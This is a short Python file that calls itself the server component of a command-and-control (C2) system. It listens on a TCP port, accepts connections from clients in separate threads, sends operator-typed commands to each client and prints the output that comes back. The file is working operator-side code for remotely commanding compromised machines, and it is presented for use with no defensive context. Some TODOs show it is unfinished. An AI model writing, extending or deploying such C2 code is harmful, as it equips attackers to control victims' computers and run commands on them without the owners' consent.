"""
Server component of C2
"""
import socket
import threading 

# Host and port to listen for connections on 
HOST = "192.168.232.1"
PORT = 12102

#TODO: Handle and switch between multiple clients

# Function to handle connection for client (each client is its own thread)
def handle(client_sock, client_addr): 
    #Infinite loop that sends input to and recieves data from client
    while True:
        command = input("> ")
        padCommand = (command.ljust(1024, "\0")).encode("utf-8")
        #TODO: catch error for when forcibly closed
        client_sock.send(padCommand)

        # Receiving output from the client
        if(command != "quit"):
            # Recieve one byte at a time, end character is 0xFF
            output = bytes.decode(client_sock.recv(1))
            while True: 
                data = client_sock.recv(1)
                if(data == b"\xff"):
                    break
                output += bytes.decode(data)
            print(output)
        else:
            break
        
    # Close client socket when done
    client_sock.close()

# TODO: Create sick command menu for interacting with server
def main():    
    # Creating server socket 
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind((HOST, PORT))
    server_sock.listen(1000)
    print("Server is listening...")

    # Loop that handles client connections by making each one a separate thread
    # TODO: create queues for every client thread, create a dictionary that stores threads and their queues
    while True: 
        # Getting connection and spawning thread
        (client_sock, client_addr) = server_sock.accept()
        print("Connected from: ", client_addr)
        thread = threading.Thread(target = handle, args = [client_sock, client_addr])
        thread.start()

    # Close server socket 
    server_sock.close()

if __name__ == '__main__':
    main()